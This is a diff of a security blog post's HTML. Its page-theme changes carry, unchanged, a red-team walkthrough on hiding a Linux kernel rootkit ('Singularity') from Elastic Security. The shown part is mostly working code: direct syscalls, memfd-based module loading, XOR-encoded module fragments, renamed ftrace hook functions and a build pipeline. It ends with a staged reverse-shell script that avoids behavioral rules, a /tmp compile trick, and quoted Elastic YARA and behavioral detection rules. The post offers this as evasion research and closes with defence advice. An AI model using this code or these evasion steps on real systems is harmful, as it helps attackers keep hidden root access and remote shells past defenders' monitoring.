 </span></span></span><span class="line"><span class="cl"><span class="cm"> * 
@@ -528,7 +624,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define MAX_CHUNK_SIZE      (1024 * 1024)  </span><span class="c1">// 1MB
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define XOR_KEY_SIZE        16
 </span></span></span><span class="line"><span class="cl"><span class="cp">#define MODULE_FLAGS        0
-</span></span></span></code></pre></div><h3 id="direct-syscall-implementation">Direct Syscall Implementation</h3>
+</span></span></span></code></pre></div><h3 id="direct-syscall-implementation">Direct Syscall Implementation<a hidden class="anchor" aria-hidden="true" href="#direct-syscall-implementation">#</a></h3>
 <p>To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Direct 64-bit syscall
 </span></span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kr">inline</span> <span class="kt">long</span> <span class="nf">syscall_direct_64</span><span class="p">(</span><span class="kt">long</span> <span class="n">number</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg1</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg2</span><span class="p">,</span> <span class="kt">long</span> <span class="n">arg3</span><span class="p">)</span> <span class="p">{</span>
@@ -562,7 +658,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <ul>
 <li><strong>32-bit Syscall:</strong> The int $0x80 interface is legacy and less monitored than modern syscall instruction</li>
 </ul>
-<h3 id="memory-file-descriptor-creation">Memory File Descriptor Creation</h3>
+<h3 id="memory-file-descriptor-creation">Memory File Descriptor Creation<a hidden class="anchor" aria-hidden="true" href="#memory-file-descriptor-creation">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">create_memfd</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">syscall_direct_64</span><span class="p">(</span><span class="n">__NR_memfd_create</span><span class="p">,</span> <span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    
@@ -582,14 +678,14 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <li><strong>Contains plaintext .ko after XOR decode</strong> (but only temporarily)</li>
 </ul>
 <p>Remember that EDRs can monitor <code>memfd_create()</code> calls, and it can also be detected in <code>/proc/&lt;pid&gt;/fd/</code> during the brief loading window.</p>
-<h3 id="xor-decoder">XOR Decoder</h3>
+<h3 id="xor-decoder">XOR Decoder<a hidden class="anchor" aria-hidden="true" href="#xor-decoder">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">xor_decode</span><span class="p">(</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">key_len</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">key_len</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p><strong>Critical Note:</strong> This decode operation restores all strings to plaintext, including &ldquo;GPL&rdquo; and &ldquo;kallsyms_lookup_name&rdquo;. The evasion relies on the <strong>ephemeral nature</strong> of this plaintext state, not permanent obfuscation.</p>
-<h3 id="fragment-loading">Fragment Loading</h3>
+<h3 id="fragment-loading">Fragment Loading<a hidden class="anchor" aria-hidden="true" href="#fragment-loading">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">load_fragments</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dir_path</span><span class="p">,</span> <span class="n">Fragment</span> <span class="o">*</span><span class="n">fragments</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">num_fragments</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="nf">opendir</span><span class="p">(</span><span class="n">dir_path</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span> <span class="p">{</span>
@@ -663,7 +759,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h3 id="module-loading">Module Loading</h3>
+</span></span></code></pre></div><h3 id="module-loading">Module Loading<a hidden class="anchor" aria-hidden="true" href="#module-loading">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">load_module_stealthy</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">params</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Loading module via direct syscall...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    
@@ -683,7 +779,7 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 </span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Module loaded successfully!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h3 id="complete-loading-workflow">Complete Loading Workflow</h3>
+</span></span></code></pre></div><h3 id="complete-loading-workflow">Complete Loading Workflow<a hidden class="anchor" aria-hidden="true" href="#complete-loading-workflow">#</a></h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="c1">// 1. Load fragments
 </span></span></span><span class="line"><span class="cl">    <span class="n">Fragment</span> <span class="n">fragments</span><span class="p">[</span><span class="n">MAX_FRAGMENTS</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
@@ -746,15 +842,15 @@ Condition: 3 license strings OR 2 specific strings OR 4 hook patterns
 <li>Must bypass rootkit&rsquo;s anti-analysis features post-load</li>
 <li>Disk-based YARA scanning ineffective against XOR&rsquo;ed fragments</li>
 </ul>
-<h1 id="evasion-technique-3-ftrace-helper-obfuscation">Evasion Technique 3: Ftrace Helper Obfuscation</h1>
-<h2 id="the-problem-2">The Problem</h2>
+<h1 id="evasion-technique-3-ftrace-helper-obfuscation">Evasion Technique 3: Ftrace Helper Obfuscation<a hidden class="anchor" aria-hidden="true" href="#evasion-technique-3-ftrace-helper-obfuscation">#</a></h1>
+<h2 id="the-problem-2">The Problem<a hidden class="anchor" aria-hidden="true" href="#the-problem-2">#</a></h2>
 <p>Elastic&rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:</p>
 <pre tabindex="0"><code>$str1 = &#34;fh_install_hook&#34;
 $str2 = &#34;fh_remove_hook&#34;
 $str3 = &#34;fh_resolve_hook_address&#34;
 Condition: 2 of them
 </code></pre><p>These are standard function names in ftrace hooking frameworks, making them easy signatures.</p>
-<h2 id="the-solution-rename-ftrace-framework-functions">The Solution: Rename Ftrace Framework Functions</h2>
+<h2 id="the-solution-rename-ftrace-framework-functions">The Solution: Rename Ftrace Framework Functions<a hidden class="anchor" aria-hidden="true" href="#the-solution-rename-ftrace-framework-functions">#</a></h2>
 <p>Our obfuscator treats ftrace helper functions like any other custom function:</p>
 <p><strong>Before:</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// ftrace/ftrace_helper.c
@@ -829,7 +925,7 @@ Condition: 2 of them
 </span></span><span class="line"><span class="cl">        <span class="nf">net_abqzpx_handler</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hooks</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
 </span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn&rsquo;t care about function names in loaded modules.</p>
-<h1 id="build-pipeline-automated-obfuscation-workflow">Build Pipeline: Automated Obfuscation Workflow</h1>
+<h1 id="build-pipeline-automated-obfuscation-workflow">Build Pipeline: Automated Obfuscation Workflow<a hidden class="anchor" aria-hidden="true" href="#build-pipeline-automated-obfuscation-workflow">#</a></h1>
 <p>Our automated build system chains all evasion techniques in a reproducible pipeline:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="nb">set</span> -e
@@ -855,19 +951,25 @@ Condition: 2 of them
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;    - fragments/ (module fragments)&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;    - loader&#34;</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;    - NO obfuscated code left behind&#34;</span>
-</span></span></code></pre></div><h1 id="final-test-successful-evasion">Final Test: Successful Evasion</h1>
-<p><img src="https://i.imgur.com/U7aDfWb.png" alt="imgur"></p>
+</span></span></code></pre></div><h1 id="final-test-successful-evasion">Final Test: Successful Evasion<a hidden class="anchor" aria-hidden="true" href="#final-test-successful-evasion">#</a></h1>
+<p><img loading="lazy" src="https://i.imgur.com/U7aDfWb.png" alt="imgur"  />
+</p>
 <p>In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.</p>
-<p><img src="https://i.imgur.com/aIjbJH5.png" alt="imgur"></p>
+<p><img loading="lazy" src="https://i.imgur.com/aIjbJH5.png" alt="imgur"  />
+</p>
 <p>Now, using the loader, we can load Singularity without being detected.</p>
-<p><img src="https://i.imgur.com/v3R3Nau.png" alt="imgur"></p>
+<p><img loading="lazy" src="https://i.imgur.com/v3R3Nau.png" alt="imgur"  />
+</p>
 <p>Testing one of singularity features hiding our process and become root.</p>
-<p><img src="https://i.imgur.com/g6CxiOE.png" alt="imgur"></p>
+<p><img loading="lazy" src="https://i.imgur.com/g6CxiOE.png" alt="imgur"  />
+</p>
 <p>With these techniques, we successfully bypass Elastic Security&rsquo;s static detection mechanisms.</p>
-<h1 id="bonus-compilation-path-detection-bypass">Bonus: Compilation Path Detection Bypass</h1>
-<p><img src="https://i.imgur.com/iNyIQHD.png" alt="imgur"></p>
+<h1 id="bonus-compilation-path-detection-bypass">Bonus: Compilation Path Detection Bypass<a hidden class="anchor" aria-hidden="true" href="#bonus-compilation-path-detection-bypass">#</a></h1>
+<p><img loading="lazy" src="https://i.imgur.com/iNyIQHD.png" alt="imgur"  />
+</p>
 <p>By default, Elastic Security actively monitors compilation activity in <code>/dev/shm</code> and automatically terminates the process when it detects suspicious operations like compiling <code>loader.c</code> or the Singularity rootkit.</p>
-<p><img src="https://i.imgur.com/Dc3TZhi.png" alt="imgur"></p>
+<p><img loading="lazy" src="https://i.imgur.com/Dc3TZhi.png" alt="imgur"  />
+</p>
 <p><strong>Simple Evasion Technique:</strong></p>
 <p>This detection can be easily bypassed by compiling in alternative directories that are less monitored:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Instead of /dev/shm (monitored):</span>
@@ -878,17 +980,19 @@ Condition: 2 of them
 </span></span><span class="line"><span class="cl">gcc -o /var/tmp/loader loader.c  <span class="c1"># Bypasses detection</span>
 </span></span></code></pre></div><p><strong>Why This Works:</strong></p>
 <p>Elastic&rsquo;s behavioral detection rules prioritize monitoring <code>/dev/shm</code> due to its common use in malware. Alternative writable directories like <code>/tmp</code> and <code>/var/tmp</code> receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.</p>
-<h1 id="bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells">Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells</h1>
+<h1 id="bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells">Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells<a hidden class="anchor" aria-hidden="true" href="#bonus-2-bypassing-elastic-behavioral-detection-for-reverse-shells">#</a></h1>
 <p>The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic&rsquo;s behavioral detection rules caught the reverse shell execution.</p>
-<h2 id="the-detection-problem">The Detection Problem</h2>
-<p><img src="https://i.imgur.com/mxNbtVX.png" alt="imgur">
-<img src="https://i.imgur.com/3hPxXPD.png" alt="imgur"></p>
+<h2 id="the-detection-problem">The Detection Problem<a hidden class="anchor" aria-hidden="true" href="#the-detection-problem">#</a></h2>
+<p><img loading="lazy" src="https://i.imgur.com/mxNbtVX.png" alt="imgur"  />
+
+<img loading="lazy" src="https://i.imgur.com/3hPxXPD.png" alt="imgur"  />
+</p>
 <p>Elastic triggered two behavioral alerts:</p>
 <ul>
 <li><strong>&ldquo;Suspicious Execution via setsid and nohup&rdquo;</strong> (Risk: 73)</li>
 <li><strong>&ldquo;Shell Command Execution via Kworker&rdquo;</strong> (Risk: 99)</li>
 </ul>
-<h3 id="elastics-behavioral-rules">Elastic&rsquo;s Behavioral Rules</h3>
+<h3 id="elastics-behavioral-rules">Elastic&rsquo;s Behavioral Rules<a hidden class="anchor" aria-hidden="true" href="#elastics-behavioral-rules">#</a></h3>
 <p><strong>Rule 1:</strong> Detects <code>setsid</code>/<code>nohup</code> + <code>/dev/tcp/*</code> patterns<br>
 <strong>Rule 2:</strong> Detects shell processes using <code>/dev/tcp/</code> or <code>/dev/udp/</code></p>
 <p>Both rules automatically kill the process on detection.</p>
@@ -897,7 +1001,7 @@ Condition: 2 of them
 process.name in (&#34;sh&#34;, &#34;bash&#34;, &#34;zsh&#34;, &#34;dash&#34;, &#34;zmodload&#34;) and
 process.command_line like~ (&#34;*/dev/tcp/*&#34;, &#34;*/dev/udp/*&#34;, &#34;*zsh/net/tcp*&#34;, &#34;*zsh/net/udp*&#34;)
 </code></pre><p>The rule scans the <strong>entire command line</strong> for <code>/dev/tcp/</code> patterns, making simple obfuscation ineffective.</p>
-<h2 id="original-detected-code">Original Detected Code</h2>
+<h2 id="original-detected-code">Original Detected Code<a hidden class="anchor" aria-hidden="true" href="#original-detected-code">#</a></h2>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// DETECTED by Elastic
 </span></span></span><span class="line"><span class="cl"><span class="nf">snprintf</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">cmd</span><span class="p">),</span>
 </span></span><span class="line"><span class="cl">         <span class="s">&#34;bash -c &#39;&#34;</span>
@@ -914,9 +1018,9 @@ process.command_line like~ (&#34;*/dev/tcp/*&#34;, &#34;*/dev/udp/*&#34;, &#34;*
 <li><code>/dev/tcp/</code> appears in process arguments</li>
 <li>Shell spawned from kernel worker context</li>
 </ul>
-<h2 id="working-evasion-staged-script-execution">Working Evasion: Staged Script Execution</h2>
+<h2 id="working-evasion-staged-script-execution">Working Evasion: Staged Script Execution<a hidden class="anchor" aria-hidden="true" href="#working-evasion-staged-script-execution">#</a></h2>
 <p>The solution is to <strong>separate the malicious payload from process arguments</strong> by writing the script to disk first, then executing it.</p>
-<h3 id="key-changes">Key Changes</h3>
+<h3 id="key-changes">Key Changes<a hidden class="anchor" aria-hidden="true" href="#key-changes">#</a></h3>
 <p><strong>1. Write the script to disk:</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define SCRIPT_PATH &#34;/singularity&#34;
 </span></span></span><span class="line"><span class="cl">
@@ -939,7 +1043,7 @@ process.command_line like~ (&#34;*/dev/tcp/*&#34;, &#34;*/dev/udp/*&#34;, &#34;*
 </span></span></code></pre></div><p><strong>2. Execute with clean command line:</strong></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="n">SCRIPT_PATH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
 </span></span><span class="line"><span class="cl"><span class="nf">call_usermodehelper_exec</span><span class="p">(</span><span class="n">sub_info</span><span class="p">,</span> <span class="n">UMH_WAIT_PROC</span><span class="p">);</span>
-</span></span></code></pre></div><h3 id="how-it-works">How It Works</h3>
+</span></span></code></pre></div><h3 id="how-it-works">How It Works<a hidden class="anchor" aria-hidden="true" href="#how-it-works">#</a></h3>
 <p><strong>Step 1:</strong> The rootkit immediately hides the kworker thread executing the payload using <code>add_hidden_pid(current-&gt;pid)</code>, making the entire process chain invisible from the start.</p>
 <p><strong>Step 2:</strong> It writes <code>/singularity</code> containing:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
@@ -971,14 +1075,15 @@ process.command_line like~ (&#34;*/dev/tcp/*&#34;, &#34;*/dev/udp/*&#34;, &#34;*
 <li><code>kill -59 $$</code> hides the parent bash script</li>
 </ol>
 <p>Only the specific processes created by the rootkit are hidden, leaving legitimate system processes untouched.</p>
-<p><img src="https://i.imgur.com/ov9YPSL.png" alt="imgur"></p>
-<h2 id="result">Result</h2>
+<p><img loading="lazy" src="https://i.imgur.com/ov9YPSL.png" alt="imgur"  />
+</p>
+<h2 id="result">Result<a hidden class="anchor" aria-hidden="true" href="#result">#</a></h2>
 <p><strong>No behavioral alerts triggered</strong><br>
 <strong>Reverse shell establishes successfully</strong><br>
 <strong>Processes completely invisible to monitoring tools</strong><br>
 <strong>Root privileges granted automatically</strong></p>
 <p>Elastic&rsquo;s behavioral rules scan entire command lines for patterns like <code>/dev/tcp/</code>. By writing the payload to a script file first and executing it with a clean command line, we bypass detection while maintaining full functionality. The rootkit&rsquo;s <code>kill -59</code> signal automatically handles privilege escalation and process hiding.</p>
-<h1 id="conclusion">Conclusion</h1>
+<h1 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h1>
 <p>This research demonstrates techniques to evade Elastic Security&rsquo;s static YARA signatures and behavioral detection rules through:</p>
 <ul>
 <li><strong>Static Signature Evasion:</strong> Symbol randomization, module fragmentation with XOR encoding for disk-based evasion</li>
@@ -1005,33 +1110,133 @@ process.command_line like~ (&#34;*/dev/tcp/*&#34;, &#34;*/dev/udp/*&#34;, &#34;*
 <p>This layered defense-in-depth approach creates multiple barriers that must all be overcome simultaneously for detection to succeed.</p>
 <p>If you&rsquo;ve read this far, thank you for your time! Contact me via X (@MatheuzSecurity) or Discord (kprobe) for questions.</p>
 
+
   </div>
 
-  <footer class="art-foot">
-    <nav class="navlinks"><a class="prev" href="/hacking/evading-linux-edrs-with-io-uring/"><span class="label">&lt;&lt; prev</span><br>Red Team Tactics: Evading EDR on Linux with io_uring</a><a class="next" href="/hacking/ioctl-secrets/"><span class="label">next &gt;&gt;</span><br>Ioctl Secrets Writeup</a>
-    </nav>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="/tags/evasion/">Evasion</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="/hacking/ioctl-secrets/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Ioctl Secrets Writeup</span>
+  </a>
+  <a class="next" href="/hacking/evading-linux-edrs-with-io-uring/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Red Team Tactics: Evading EDR on Linux with io_uring</span>
+  </a>
+</nav>
+
   </footer>
 </article>
-    </main><footer class="foot">
+    </main>
+    
+<footer class="footer">
     <span>&copy; 2026 <a href="/">0xMatheuZ</a></span>
-    <span>built with <a href="https://gohugo.io/" target="_blank" rel="noopener">hugo</a> · handcrafted layouts</span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
 </footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
 <script>
-document.querySelectorAll('pre > code').forEach((code) => {
-    const pre = code.parentNode;
-    const wrap = pre.parentNode;
-    const btn = document.createElement('button');
-    btn.className = 'copy-code';
-    btn.type = 'button';
-    btn.textContent = 'copy';
-    const done = () => { btn.textContent = 'copied'; setTimeout(() => btn.textContent = 'copy', 1600); };
-    btn.addEventListener('click', () => {
-        navigator.clipboard.writeText(code.textContent).then(done).catch(() => {});
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
     });
-    const host = wrap.classList.contains('highlight') ? wrap : pre;
-    host.style.position = 'relative';
-    host.appendChild(btn);
-});
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
 </script>
 </body>
+
 </html>
